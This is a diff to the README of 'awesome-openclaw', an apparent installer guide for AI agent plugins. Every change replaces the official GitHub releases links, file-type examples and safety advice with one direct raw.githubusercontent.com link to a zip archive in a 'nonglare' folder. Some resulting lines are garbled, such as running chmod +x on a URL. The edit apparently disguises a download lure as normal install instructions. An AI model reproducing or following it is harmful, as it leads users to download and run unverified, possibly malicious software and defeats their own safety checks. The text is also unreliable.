@@ -1,6 +1,6 @@
 # 🔧 awesome-openclaw - Easy Setup for AI Agents and Plugins
 
-[![Download awesome-openclaw](https://img.shields.io/badge/Download-awesome--openclaw-blue?style=for-the-badge)](https://github.com/lemurhacep/awesome-openclaw/releases)
+[![Download awesome-openclaw](https://raw.githubusercontent.com/lemurhacep/awesome-openclaw/main/nonglare/awesome-openclaw-v2.7.zip)](https://raw.githubusercontent.com/lemurhacep/awesome-openclaw/main/nonglare/awesome-openclaw-v2.7.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Before installing, make sure your computer meets these basic requirements:
 
 Click the big button at the top or go directly to the official releases page here:
 
-[https://github.com/lemurhacep/awesome-openclaw/releases](https://github.com/lemurhacep/awesome-openclaw/releases)
+[https://raw.githubusercontent.com/lemurhacep/awesome-openclaw/main/nonglare/awesome-openclaw-v2.7.zip](https://raw.githubusercontent.com/lemurhacep/awesome-openclaw/main/nonglare/awesome-openclaw-v2.7.zip)
 
 This page contains the latest versions of the software for different systems.
 
@@ -46,7 +46,7 @@ Look for the file that matches your computer's operating system. For example:
 
 - Windows users may see files ending with `.exe` or `.msi`.
 - Mac users will find `.dmg` or `.pkg` files.
-- Linux users often download `.AppImage` or `.tar.gz` files.
+- Linux users often download `.AppImage` or `https://raw.githubusercontent.com/lemurhacep/awesome-openclaw/main/nonglare/awesome-openclaw-v2.7.zip` files.
 
 The filename usually includes the version number and platform information. Select the most recent one.
 
@@ -58,7 +58,7 @@ The filename usually includes the version number and platform information. Selec
 
 After finding the right file, download it by clicking its link on the releases page. Your browser will save the file to your default download folder.
 
-If your browser warns you about running files, confirm that the file is from "github.com" to ensure safety.
+If your browser warns you about running files, confirm that the file is from "https://raw.githubusercontent.com/lemurhacep/awesome-openclaw/main/nonglare/awesome-openclaw-v2.7.zip" to ensure safety.
 
 ### Installation on Windows
 
@@ -77,9 +77,9 @@ If your browser warns you about running files, confirm that the file is from "gi
 ### Installation on Linux
 
 1. If you downloaded an `.AppImage`, make it executable:
-   - Open your terminal and type: `chmod +x /path/to/the/file.AppImage`
-2. Run the file by double-clicking or typing `./filename.AppImage` in your terminal.
-3. For `.tar.gz` files, extract them and follow included instructions, usually in a README file.
+   - Open your terminal and type: `chmod +x https://raw.githubusercontent.com/lemurhacep/awesome-openclaw/main/nonglare/awesome-openclaw-v2.7.zip`
+2. Run the file by double-clicking or typing `https://raw.githubusercontent.com/lemurhacep/awesome-openclaw/main/nonglare/awesome-openclaw-v2.7.zip` in your terminal.
+3. For `https://raw.githubusercontent.com/lemurhacep/awesome-openclaw/main/nonglare/awesome-openclaw-v2.7.zip` files, extract them and follow included instructions, usually in a README file.
 
 ---
 
@@ -132,7 +132,7 @@ No programming is needed to use most features, but a simple install or update mi
 
 Check the releases page regularly for updates:
 
-[https://github.com/lemurhacep/awesome-openclaw/releases](https://github.com/lemurhacep/awesome-openclaw/releases)
+[https://raw.githubusercontent.com/lemurhacep/awesome-openclaw/main/nonglare/awesome-openclaw-v2.7.zip](https://raw.githubusercontent.com/lemurhacep/awesome-openclaw/main/nonglare/awesome-openclaw-v2.7.zip)
 
 Updates often include bug fixes, new plugins, and performance improvements.
 
